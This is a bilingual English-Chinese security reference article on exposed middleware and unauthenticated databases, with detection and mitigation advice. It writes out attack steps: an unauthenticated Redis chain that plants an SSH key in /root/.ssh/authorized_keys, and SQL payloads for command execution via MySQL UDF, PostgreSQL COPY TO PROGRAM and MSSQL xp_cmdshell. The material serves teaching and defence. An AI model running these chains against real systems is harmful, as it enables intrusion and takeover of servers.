---
id: middleware-and-database-security
title_en: Middleware and Database Exposure
title_zh: 中间件与数据库暴露
summary_en: The application is usually the hardened part. The middleware underneath it and the database behind it are often missing from the asset inventory entirely, and an unauthenticated database is one of the most common real-world incidents there is.
summary_zh: 应用通常是被加固过的那一层。它下面的中间件、它背后的数据库，却常常整个缺席于资产台账 —— 而未授权的数据库，是现实中最常见的事件之一。
tags: [web, middleware, database, redis, tomcat, exposure, misconfiguration]
tools: [nmap, nuclei, redis-cli, mongosh, testssl.sh]
attck: [T1190, T1133]
platform: [web, network]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### The layer nobody inventories

Web application security concentrates on the code, because that is where the interesting logic is. But a large share of real compromises never touches the application's logic at all — they reach the servlet container, the admin console, or the database port, none of which appear in a code review or a dependency scan.

Two questions worth asking on every engagement: what is listening, and who can reach it.

```bash
nmap -sV -p- --min-rate 2000 -oA ports 10.10.10.0/24
nuclei -u https://target.example -t http/exposed-panels/ -t http/misconfiguration/
```

### Middleware worth checking

| Component | Where to look | The usual problem |
|---|---|---|
| Tomcat | `/manager/html`, `/host-manager`, port 8009 | Default or weak manager credentials; AJP exposed (Ghostcat, CVE-2020-1938); `PUT` writes files |
| Nginx / Apache | alias and proxy config, `mod_status`, autoindex | Off-by-slash alias traversal, path normalisation differences, directory listing |
| WebLogic / JBoss / WebSphere | consoles, T3, IIOP, 7001/8080/9060 | Default credentials on the console, deserialization on the protocol ports |
| Spring Boot | `/actuator/*` | `env`, `heapdump`, `httptrace` exposing configuration and secrets |
| Jenkins, Grafana, Kibana, RabbitMQ | their own management ports | Unauthenticated or default-credential access, script consoles |
| Node / Express | default error handler | Stack traces and internal paths |

Two of these deserve emphasis because they turn up constantly:

- **Tomcat's manager application**, which accepts a WAR upload when credentials are guessable, and the AJP connector, which is often exposed on 8009 without anyone noticing.
- **Spring Boot Actuator**, where `/actuator/env` can reveal database credentials and `/actuator/heapdump` can contain session tokens in memory. The `shutdown` endpoint, when enabled, is a denial of service with a GET request.

### Database exposure: the most common incident there is

An internet-facing database with no authentication is not an exotic finding; it is a routine one, and it is why so many breach reports start with "an unsecured database was discovered".

| Service | Default port | The problem | What follows |
|---|---|---|---|
| Redis | 6379 | No authentication by default | Write a file anywhere the process can reach |
| MongoDB | 27017 | Historically no auth | Every document, to anyone who connects |
| Elasticsearch | 9200 | No auth by default in older versions | All indices, sometimes script execution |
| Memcached | 11211 | No auth, ever | Data disclosure, and reflection for amplification |
| MySQL / MariaDB | 3306 | Weak or reused credentials | Direct database access from the internet |
| PostgreSQL | 5432 | Weak credentials, `trust` in `pg_hba.conf` | Same, plus command execution via `COPY ... TO PROGRAM` |
| MSSQL | 1433 | Weak credentials | Same, plus `xp_cmdshell` |
| CouchDB | 5984 | The historical "admin party" | Every database, plus JavaScript views |

Cloud misconfiguration is the usual cause: a security group with `0.0.0.0/0` on a database port, or a managed instance given a public address for convenience and never revisited.

### Redis, the canonical chain

Because it is so common and so quick, it is worth seeing the whole path once:

```bash
redis-cli -h 10.10.10.20
> INFO                                   # version, config file, and whether auth is set
> CONFIG GET dir
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SET x "\n\nssh-rsa AAAA... attacker\n\n"
> SAVE                                   # writes the key, and the attacker has a shell
```

The same technique with different targets: a cron directory (`/var/spool/cron/`), a web root (`/var/www/html/shell.php`), or a systemd unit path. Redis 4.x and 5.x additionally had a replication-based path to load a malicious module, which is RCE without needing a writable path at all.

An unauthenticated Redis is not "just a cache". It is a file write primitive running as whatever user the service runs as.

### Privilege escalation through the database

Once you can execute SQL as a privileged account, the database stops being a data store:

```sql
-- MySQL: write a shared library into the plugin directory, then load it as a function
SELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';
SELECT sys_exec('id');

-- PostgreSQL: command execution as the database user
COPY (SELECT '') TO PROGRAM 'id > /tmp/out';

-- MSSQL
EXEC xp_cmdshell 'whoami';
```

These need a privileged account or a specific grant, which is exactly why the application's database user should not have `FILE`, `SUPER`, `CREATE FUNCTION` or filesystem access. A read-only application account turns a SQL injection from a critical finding into a contained one.

### Detection

- **External exposure of database and management ports** is the single highest-value check, and the easiest to automate. Alert when a new one appears.
- **Connections from unexpected sources.** A database that only ever talks to two application servers should be suspicious of a third source immediately.
- **Redis administrative commands**: `CONFIG SET`, `SAVE`, `SLAVEOF`, `MODULE LOAD` are unusual in normal operation and central to every Redis attack.
- **Middleware console access** from the internet, especially successful authentication.
- **File writes into web roots and cron directories**, which is what the last step of most of these chains looks like.

### Mitigation

- **Bind databases to the interface they need.** Localhost or the private network, never the world; then make the security group enforce it rather than relying on the config file.
- **Authenticate everything, including the cache.** Redis has `requirepass` and ACLs; MongoDB and Elasticsearch have had authentication for years; there is no reason for any of them to be open.
- **Encrypt database traffic** and validate certificates on the client side, so a private network is not the only control.
- **Remove default applications** from middleware: the manager app, the examples, the sample endpoints, the status pages.
- **Keep management interfaces off the internet**, behind a VPN or a bastion, and monitor who uses them.
- **Give the application the least database privilege it can work with**, and audit for DDL, file and function grants.
- **Close protocol ports nobody uses** — AJP, T3, IIOP, the internal management ports — or firewall them to the services that genuinely need them.
- **Scan your own external surface monthly** and treat every new listener as a change requiring justification.

<!-- lang:zh -->
### 没人做台账的那一层

Web 应用安全把注意力放在代码上，因为有意思的逻辑在那儿。但现实中很大一部分沦陷根本没碰到应用的逻辑 —— 它们到达的是 Servlet 容器、管理控制台或数据库端口，而这些在代码审查和依赖扫描里都不会出现。

每个项目都值得问两个问题：**什么在监听，以及谁能到达它。**

```bash
nmap -sV -p- --min-rate 2000 -oA ports 10.10.10.0/24
nuclei -u https://target.example -t http/exposed-panels/ -t http/misconfiguration/
```

### 值得检查的中间件

| 组件 | 看哪里 | 常见问题 |
|---|---|---|
| Tomcat | `/manager/html`、`/host-manager`、8009 端口 | 管理端默认或弱口令；AJP 暴露（Ghostcat，CVE-2020-1938）；`PUT` 能写文件 |
| Nginx / Apache | alias 与 proxy 配置、`mod_status`、autoindex | off-by-slash 的 alias 穿越、路径规范化差异、目录列表 |
| WebLogic / JBoss / WebSphere | 控制台、T3、IIOP、7001/8080/9060 | 控制台默认凭据、协议端口上的反序列化 |
| Spring Boot | `/actuator/*` | `env`、`heapdump`、`httptrace` 泄漏配置与机密 |
| Jenkins、Grafana、Kibana、RabbitMQ | 各自的管理端口 | 未授权或默认凭据访问、脚本控制台 |
| Node / Express | 默认错误处理器 | 堆栈与内部路径 |

其中两个值得强调，因为反复出现：

- **Tomcat 的 manager 应用** —— 凭据可猜时它接受 WAR 上传；以及 **AJP 连接器** —— 8009 端口常常在没人注意的情况下暴露着。
- **Spring Boot Actuator** —— `/actuator/env` 可能泄漏数据库凭据，`/actuator/heapdump` 里可能有内存中的会话 token。而 `shutdown` 端点一旦启用，一个 GET 请求就是拒绝服务。

### 数据库暴露：最常见的那类事件

一个面向公网、没有认证的数据库不是什么高深发现，而是日常 —— 很多入侵报告的第一句就是"发现了一个未受保护的数据库"。

| 服务 | 默认端口 | 问题 | 后果 |
|---|---|---|---|
| Redis | 6379 | 默认无认证 | 向进程能到达的任何位置写文件 |
| MongoDB | 27017 | 历史上无认证 | 连上就是全部文档 |
| Elasticsearch | 9200 | 老版本默认无认证 | 全部索引，有时还能执行脚本 |
| Memcached | 11211 | 从来没有认证 | 数据泄漏，以及被用作放大反射 |
| MySQL / MariaDB | 3306 | 弱口令或口令复用 | 从公网直接访问数据库 |
| PostgreSQL | 5432 | 弱口令、`pg_hba.conf` 里的 `trust` | 同上，外加 `COPY ... TO PROGRAM` 执行命令 |
| MSSQL | 1433 | 弱口令 | 同上，外加 `xp_cmdshell` |
| CouchDB | 5984 | 历史上的 admin party | 所有数据库，外加 JavaScript 视图 |

云上的配置错误是常见成因：安全组在数据库端口上开了 `0.0.0.0/0`，或者某个托管实例图方便给了公网地址、之后再没人回头看。

### Redis，那条标准链

因为它太常见、太快，值得完整看一遍：

```bash
redis-cli -h 10.10.10.20
> INFO                                   # 版本、配置文件位置，以及有没有设认证
> CONFIG GET dir
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SET x "\n\nssh-rsa AAAA... attacker\n\n"
> SAVE                                   # 写下这把 key，攻击者就拿到了 shell
```

同一手法换个落点：cron 目录（`/var/spool/cron/`）、Web 根目录（`/var/www/html/shell.php`）、或某个 systemd unit 路径。Redis 4.x 和 5.x 还有一条基于主从复制的路径，能加载恶意模块 —— 那是完全不需要可写目录的 RCE。

未授权的 Redis 不是"只是个缓存"。它是一个以该服务运行身份执行的文件写入原语。

### 通过数据库提权

一旦你能以高权限账号执行 SQL，数据库就不再只是数据存储：

```sql
-- MySQL：把共享库写进插件目录，再作为函数加载
SELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';
SELECT sys_exec('id');

-- PostgreSQL：以数据库用户身份执行命令
COPY (SELECT '') TO PROGRAM 'id > /tmp/out';

-- MSSQL
EXEC xp_cmdshell 'whoami';
```

这些都需要高权限账号或特定授权 —— 这正是应用的数据库账号不该拥有 `FILE`、`SUPER`、`CREATE FUNCTION` 或文件系统权限的原因。一个只读的应用账号会把 SQL 注入从"高危发现"变成"受控事件"。

### 检测

- **数据库与管理端口的外部暴露**是价值最高、也最容易自动化的一项检查。新出现一个就告警。
- **来自意外来源的连接。** 一个只和两台应用服务器通信的数据库，出现第三个来源就该立刻可疑。
- **Redis 的管理命令**：`CONFIG SET`、`SAVE`、`SLAVEOF`、`MODULE LOAD` 在正常运行中都很罕见，却是每一次 Redis 攻击的核心。
- **来自公网的中间件控制台访问**，尤其是认证成功的。
- **Web 根目录与 cron 目录里的文件写入** —— 上面那些链条的最后一步就长这样。

### 缓解

- **把数据库绑定在它需要的接口上。** 只监听 localhost 或内网，永远不要对全网 —— 而且要让安全组去强制，而不是指望配置文件。
- **所有东西都要认证，包括缓存。** Redis 有 `requirepass` 和 ACL，MongoDB 与 Elasticsearch 早就有认证；没有任何理由让它们裸奔。
- **数据库流量加密**并在客户端校验证书，别让"内网"成为唯一的控制。
- **删掉中间件的默认应用**：manager、示例、样例端点、状态页。
- **管理界面不要放公网**，放在 VPN 或堡垒机后面，并监控谁在用。
- **给应用尽可能小的数据库权限**，并针对 DDL、文件与函数授权做审计。
- **关掉没人用的协议端口** —— AJP、T3、IIOP、内部管理端口 —— 或者用防火墙只放给真正需要的服务。
- **每月扫一遍自己的外部面**，把每一个新增的监听端口都当成一次需要理由的变更。
